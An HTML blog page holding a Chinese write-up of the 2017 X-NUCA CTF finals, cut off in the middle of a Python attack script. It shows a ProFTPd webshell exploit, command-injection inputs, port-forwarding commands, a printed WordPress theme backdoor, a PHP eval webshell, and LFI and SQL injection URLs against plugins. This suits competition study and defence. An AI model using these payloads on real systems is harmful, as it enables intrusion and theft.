@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <title>[2017 X-NUCA]总决赛小结 | Pr0ph3t</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="这次X-NUCA的线下赛分成两个部分，第一个是个人赛(纯渗透) 第二个是团队赛(渗透+A&amp;D)     个人赛 个人赛的网络拓扑图  （图片有点糊  简单来说就是： 选手 –&amp;gt; 连接VPN –&amp;gt; 到内网访问竞赛平台,通过竞赛平台得到跳板机(攻击机)的ip、连接端口和密码(注意这里的攻击机的意思是你要去这部机上面去攻击靶机)，主办方提供了两部攻击机，一部linux一部windows，攻击机不能访问外">
+<meta name="keywords" content="CyberSecurity,Attack&amp;Defense,old">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[2017 X-NUCA]总决赛小结">
+<meta property="og:url" content="https://blog.pr0ph3t.com/2017/12/23/2017-X-NUCA-总决赛小结/index.html">
+<meta property="og:site_name" content="Pr0ph3t">
+<meta property="og:description" content="这次X-NUCA的线下赛分成两个部分，第一个是个人赛(纯渗透) 第二个是团队赛(渗透+A&amp;D)     个人赛 个人赛的网络拓扑图  （图片有点糊  简单来说就是： 选手 –&amp;gt; 连接VPN –&amp;gt; 到内网访问竞赛平台,通过竞赛平台得到跳板机(攻击机)的ip、连接端口和密码(注意这里的攻击机的意思是你要去这部机上面去攻击靶机)，主办方提供了两部攻击机，一部linux一部windows，攻击机不能访问外">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-2265681a7d9cfd90.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-1752b51138755024.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-0e96c3c3a6ae3405.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-07-06T09:55:35.444Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="[2017 X-NUCA]总决赛小结">
+<meta name="twitter:description" content="这次X-NUCA的线下赛分成两个部分，第一个是个人赛(纯渗透) 第二个是团队赛(渗透+A&amp;D)     个人赛 个人赛的网络拓扑图  （图片有点糊  简单来说就是： 选手 –&amp;gt; 连接VPN –&amp;gt; 到内网访问竞赛平台,通过竞赛平台得到跳板机(攻击机)的ip、连接端口和密码(注意这里的攻击机的意思是你要去这部机上面去攻击靶机)，主办方提供了两部攻击机，一部linux一部windows，攻击机不能访问外">
+<meta name="twitter:image" content="http://upload-images.jianshu.io/upload_images/6949366-2265681a7d9cfd90.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+  
+    <link rel="alternative" href="/atom.xml" title="Pr0ph3t" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.webp" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">Pr0ph3t</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">菜菜菜</p>
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/articles">文章</a></li>
+                        
+                            <li><a href="/about">关于我</a></li>
+                        
+                            <li><a href="/tags">tags</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="mailto://admin@pr0ph3t.com" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/Pr0phet" title="github">github</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Attack-Defense/" style="font-size: 12.5px;">Attack&Defense</a> <a href="/tags/CyberSecurity/" style="font-size: 20px;">CyberSecurity</a> <a href="/tags/crypto/" style="font-size: 10px;">crypto</a> <a href="/tags/hitcon/" style="font-size: 15px;">hitcon</a> <a href="/tags/old/" style="font-size: 20px;">old</a> <a href="/tags/writeup/" style="font-size: 17.5px;">writeup</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://aluvion.github.io">twings</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://blog.de1ta.club">De1ta</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">Pr0ph3t</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.webp" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">Pr0ph3t</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">菜菜菜</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/articles">文章</a></li>
+                
+                    <li><a href="/about">关于我</a></li>
+                
+                    <li><a href="/tags">tags</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="mailto://admin@pr0ph3t.com" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://github.com/Pr0phet" title="github">github</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-2017-X-NUCA-总决赛小结" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/12/23/2017-X-NUCA-总决赛小结/" class="article-date">
+      <time datetime="2017-12-23T15:27:00.000Z" itemprop="datePublished">2017-12-23</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      [2017 X-NUCA]总决赛小结
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Attack-Defense/">Attack&Defense</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CyberSecurity/">CyberSecurity</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/old/">old</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <blockquote>
+<p>这次X-NUCA的线下赛分成两个部分，第一个是个人赛(纯渗透) 第二个是团队赛(渗透+A&amp;D)</p>
+</blockquote>
+<hr>
+<h2 id="个人赛"><a href="#个人赛" class="headerlink" title="个人赛"></a>个人赛</h2><p>个人赛的网络拓扑图<br><img src="http://upload-images.jianshu.io/upload_images/6949366-2265681a7d9cfd90.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="个人赛拓扑.jpeg"><br>（图片有点糊</p>
+<p>简单来说就是：<br>选手 –&gt; 连接VPN  –&gt; 到内网访问竞赛平台,通过竞赛平台得到跳板机(攻击机)的ip、连接端口和密码(注意这里的攻击机的意思是你要去这部机上面去攻击靶机)，主办方提供了两部攻击机，一部linux一部windows，攻击机不能访问外网</p>
+<p>因为自己的电脑是可以访问外网的 所以一直在思考能不能将题目都通过端口转发转出去公网后让小伙伴也体验一下（最终还是没有尝试。。。因为做题时间实在是太紧了。。。</p>
+<p>主办方一共给出了6个靶机，其中有一题是pwn，题目ip和端口都要求自己扫描出来</p>
+<p>扫出来之后发现很多都有开放22端口、80端口和3306端口，第二题还开放了21端口<br>然后其中我做出来的是第二题，ftp尝试连接之后发现是ProFTP 1.3.5，经过主办方放hint后知道突破点在这个ftp的mod_copy模块上，搜一波cve发现是这个<a href="https://www.exploit-db.com/exploits/36803/" target="_blank" rel="noopener">ProFTPd 1.3.5 - ‘mod_copy’ Remote Command Execution</a> 其实msf也有相应的模块可以直接用 直接写webshell到web默认目录(/var/www/html/)后getshell看flag</p>
+<blockquote>
+<p>其他题目问了各位师傅后简单总结。。。。因为没看到题目可以描述有点偏差。。请各位大佬斧正Orz</p>
+</blockquote>
+<ul>
+<li><p>第一题<br>题目开放端口：22、80、3306<br>80端口是一个Joomla 扫描目录会发现有<strong><em><a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></em></strong>目录备份 里面会有一个moadmin.php文件，这里师傅说15年百度杯的时候出过相类似的题目，moadmin.php里面有任意命令执行 <a href="https://zhuanlan.zhihu.com/p/26149713" target="_blank" rel="noopener">相关链接</a></p>
+</li>
+<li><p>第二题<br>题目开放端口：21、22、80、3306<br>上述</p>
+</li>
+<li><p>第三题<br>题目开放端口：22、80、10000<br>这题是pwn题 进去80下载二进制文件 不懂二进制。。。就不分析了Orz。。需要文件的大佬可以私聊一下我</p>
+</li>
+<li><p>第四题<br>题目开放端口：22、80、3306<br>大佬说这题很奇怪。。。80端口是个joomla，然后ssh连接root@ip之后会返回一个sqli文件？？？？然后里面泄漏了一个webshell的名字，然后访问cat flag就行了</p>
+</li>
+<li><p>第五题<br>题目开放端口：22<br>第五题主办方提示了是一个新手写的python脚本，其中开放了udp端口 然后要注意的是nmap默认不扫udp端口 然后扫到端口之后连接发现疑似是一个os.system(“ls “ + input) ,直接拼接命令cat flag, 如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls | <span class="built_in">echo</span> | cat flag</span><br><span class="line">ls &amp;&amp; cat flag</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>第六题<br>题目开放端口：22、80、3306<br>一进去是一个黑页， 主办方提示和黑页作者名字有关 猜想应该是进入之后getshell cat flag 貌似暂时没人做出</p>
+</li>
+</ul>
+<hr>
+<p>我觉得这次个人赛的关键是服务探测和端口转发，包括服务所在的ip、端口、banner等等获取完整，再根据服务所在的ip和端口进行转发到攻击机上，最后在自己的电脑利用工具和现有exp进行攻击后得到flag</p>
+<p>附上端口转发常用命令：<br>Linux </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -C -f -N -g -L 本地端口:靶机:欲转发端口 跳板机用户@本地IP <span class="comment">#此命令用于转发单一端口 运行在本机上</span></span><br><span class="line">ssh -C -f -N -g -D 本地监听端口 跳板机用户@跳板机IP <span class="comment">#此命令用于动态端口转发 开启的是socks5</span></span><br></pre></td></tr></table></figure>
+
+<p>Windows</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy show all #此命令查看所有端口转发</span><br><span class="line">netsh interface portproxy add v4tov4 listenport=本地监听端口 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> connectport=欲转发端口 connectaddress=欲转发ip #此命令新增一个端口转发</span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=本地监听端口 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> #此命令删除一个端口转发</span><br></pre></td></tr></table></figure>
+
+<p>这次手慢了。。。没有来得及喝上汤。。。。。Orz膜各位大佬。。。</p>
+<hr>
+<h2 id="团队赛"><a href="#团队赛" class="headerlink" title="团队赛"></a>团队赛</h2><p>这次团队赛的比赛模式之前是没有遇到过的，网络拓扑如下(第二天才给的)：<br><img src="http://upload-images.jianshu.io/upload_images/6949366-1752b51138755024.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="部分拓扑"></p>
+<ul>
+<li>第一天下午<ul>
+<li>第一天下午是渗透+A&amp;D同时进行的模式，一共有10台靶机，也就是带有用户名为info1-info10的服务器，其中有5台是攻防机，攻防机的还有用户名score1-score5 — 攻防共有两个Web，三个Pwn。我们的目标是需要找出攻防机并趁早拿下源码和开始攻击，在这过程中10台靶机的/etc/xnuca/flag.txt路径都有渗透flag，提交会得到100分，然后攻防机还会在/opt/xnuca/flag.txt路径存储A&amp;D用的flag。</li>
+<li>根据上面的规矩我们可以知道，第一天拿到Web源码的队伍晚上肯定会通宵审计找出洞之后打全场，所以第一天的源码必须要拿下。然后实际上第一天听说只有几个队伍拿下了第一个Web的源码，只有一两支队伍拿下了第二个Web的源码，pwn的源码貌似没有人拿到？ 然后下午饭点的时候主办方将所有pwn的程序公布了出来。。。（晚上不敢睡了。。</li>
+<li>回到正题，首先我们需要扫描192.108.1.0/24得到与我们机器直连的靶机地址，然后扫描端口发现都开了445 netbios服务（本来这里是想尝试着用永恒之蓝打一下，但是主办方说这个端口是用来探测服务名称的 所以使用一个命令 nmblookup - 基于TCP/IP上的NetBIOS客户用于查询NetBIOS名字的程序 来探测服务名称</li>
+<li>首先能扫描到4台直连的存活主机，首先第一台的web服务(info1)是一个MacCMS(苹果cms)，网上搜到这个Remote Code Execute的<a href="https://www.0dayhack.com/post-285.html" target="_blank" rel="noopener">exp</a>，ls查看到一个文件名叫score1_shadow_backup文件，还有一个文件名叫password_is_phone_num_13993xxxxxx，然后shadow文件里面是score1的密码，直接丢去hashcat六位数字爆破（这里我坑了。。。没有及时告诉队友phone_num是密码提示。。。导致最后面才登录上拿到源码）然后查看数据库配置文件，有注释说这是从info2迁移的，连接数据库是info2用户，得到info2的密码为call911，然后登录上info2后在home目录发现mysql history，打开后发现是创建了一个info8的用户，密码为arkteam。</li>
+<li>第二台服务器的Web服务是Discuz 7.2，网上也能找到相应的<a href="http://blog.csdn.net/yiyefangzhou24/article/details/36913287/" target="_blank" rel="noopener">exp</a>，拿到密码之后登录，这里有点记得不太清楚了Orz。。。貌似是拿到info4的账号密码就直接ssh能登录上去了</li>
+<li>然后第三台的Web服务是一个大马 Hack By NSA。。。。。。主办方提示是nopen的后门。。。但是这个到最后面都没有解出来是啥。。。</li>
+<li>第四台Web服务是一个wordpress，后面getshell之后查看用户也可以知道这也是一台攻防机，因为看到了score1用户， 然后这里是弱密码admin/admin登录上后台之后上传插件getshell，直接将shell打包成zip后上传，他会帮你解压到wp-content/uploads/2017/12/目录下，虽然安装出错但是还是会保留下文件。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p>以上是第一层直连外网的机器(192.108.1.0/24)<br>第二层我们想开始渗透的时候发现score1已经被师傅们打了Orz。。。所以我就没有渗透第二层太多了。。这是比较大的失误。。。我们应该继续坚持渗透，拿下web2的源码的。。。。所以就这样后面的题目就没有继续渗透下去了。。。哭。。。</p>
+<hr>
+<p>我们晚上分析了一下web1的源码，主要发现了以下的几个洞：</p>
+<ol>
+<li>著名的主题后门–<a href="https://paper.seebug.org/140/" target="_blank" rel="noopener">详情</a> 这里也是大同小异<br>看/wp-content/themes/AccountingTime/Functions.php的最后面<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_getprepare_widgets</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($methods)) $methods=<span class="string">"cookie"</span>;  <span class="comment">//</span></span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($pre)) $pre=<span class="string">"wp_"</span>;  <span class="comment">//</span></span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($is_use_more)) $is_use_more=<span class="number">1</span>;  <span class="comment">// </span></span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($d)) $d=$_GET[<span class="string">"d"</span>];  <span class="comment">//</span></span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($posts_auth)) $posts_auth=<span class="string">"auth"</span>;  <span class="comment">//</span></span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($widget)) $widget=$pre.<span class="string">"set"</span>.<span class="string">"_"</span>.$posts_auth.<span class="string">"_"</span>.$methods;  <span class="comment">//</span></span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($forcemore)) $forcemore=<span class="number">1</span>;  <span class="comment">//</span></span><br><span class="line">	<span class="keyword">if</span> ($is_use_more ) &#123;</span><br><span class="line">		<span class="keyword">if</span>($forcemore) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!is_user_logged_in())</span><br><span class="line">				@call_user_func_array($widget,<span class="keyword">array</span>($d, <span class="keyword">true</span>));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$output=<span class="string">""</span>;</span><br><span class="line">	<span class="keyword">return</span> $output;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add_action(<span class="string">"init"</span>, <span class="string">"_getprepare_widgets"</span>);	 <span class="comment">// 注册函数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>我们直接在前台某个页面输入 ?d=1就可以越权登录admin了<br>登录之后可以有两个getshell点<br>第一个是对主题文件的编辑，其中有php文件<br>第二个是上传压缩成zip的webshell，上传后被解压在/wp-content/uploads/2017/12/</p>
+<ol start="2">
+<li><p>被留下的一句话<br>在/wp-includes/rest-api/endpoints/class-wp-rest-relations-controller.php中，内容为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>LFI – wp-vault插件<br>在/wp-content/plugins/wp-vault/trunk/wp-vault.php中，wpv-image参数没有过滤就直接包含<img src="http://upload-images.jianshu.io/upload_images/6949366-0e96c3c3a6ae3405.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="LFI">利用方法：<a href="http://xxx/wp-content/plugins/wp-vault/trunk/wp-vault.php?wpv-image=../../../../../../etc/passwd" target="_blank" rel="noopener">http://xxx/wp-content/plugins/wp-vault/trunk/wp-vault.php?wpv-image=../../../../../../etc/passwd</a></p>
+</li>
+<li><p>sql注入 – kittycatfish 2.2插件<br><a href="https://www.unhonker.com/bug/1991.html" target="_blank" rel="noopener">poc</a><br>注入点1 ：/wp-content/plugins/kittycatfish/base.css.php?kc_ad=31&amp;ver=2.0<br>注入点2：wp-content/plugins/kittycatfish/kittycatfish.php?kc_ad=37&amp;ver=2.0<br>都是kc_ad参数，可以使用盲注直接load_file读取flag文件</p>
+</li>
+<li><p>sql注入 – olimometer插件<br>注入点：/wp-content/plugins/olimometer/thermometer.php?olimometer_id=1<br>olimometer_id参数可以盲注</p>
+</li>
+<li><p>sql注入 – easy-modal插件<br><a href="https://www.exploit-db.com/exploits/42431/" target="_blank" rel="noopener">poc</a><br>同盲注，但是首先得登录进后台才能利用，比较鸡肋</p>
+</li>
+<li><p>sql注入？ – ultimate-product-catalogue<br>好吧这个没有注入，进去看了一下作者已经加了参数绑定了。。。</p>
+</li>
+</ol>
+<p>我们有点乱的利用脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> urllib,urllib2</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> cookielib</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">easy_webshell</span><span class="params">(root_url)</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		url = root_url + <span class="string">'/wp-includes/rest-api/endpoints/class-wp-rest-relations-controller.php?%s'</span> % <span class="string">'cmd=system("cat+/opt/xnuca/flag.txt");'</span></span><br><span class="line">		req = urllib2.Request(url = url)</span><br><span class="line">		res = urllib2.urlopen(req)</span><br><span class="line">		content = res.read()</span><br><span class="line">		<span class="keyword">if</span> content != <span class="string">''</span>:</span><br><span class="line">			<span class="keyword">print</span> root_url + <span class="string">' -- flag : '</span> + content</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">print</span> root_url + <span class="string">' fail to get flag through easy_webshell'</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	<span class="keyword">except</span> urllib2.URLError <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'web_shell error'</span> + e.reason</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LFI</span><span class="params">(root_url)</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		url = root_url + <span class="string">'/wp-content/plugins/wp-vault/trunk/wp-vault.php?wpv-image=../../../../../opt/xnuca/flag.txt'</span></span><br><span class="line">		req = urllib2.Request(url = url)</span><br><span class="line">		res = urllib2.urlopen(req)</span><br><span class="line">		content = res.read()</span><br><span class="line">		<span class="keyword">if</span> content != <span class="string">''</span>:</span><br><span class="line">			<span class="keyword">print</span> root_url + <span class="string">' -- flag : '</span> + content</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">print</span> root_url + <span class="string">' fail to get flag through 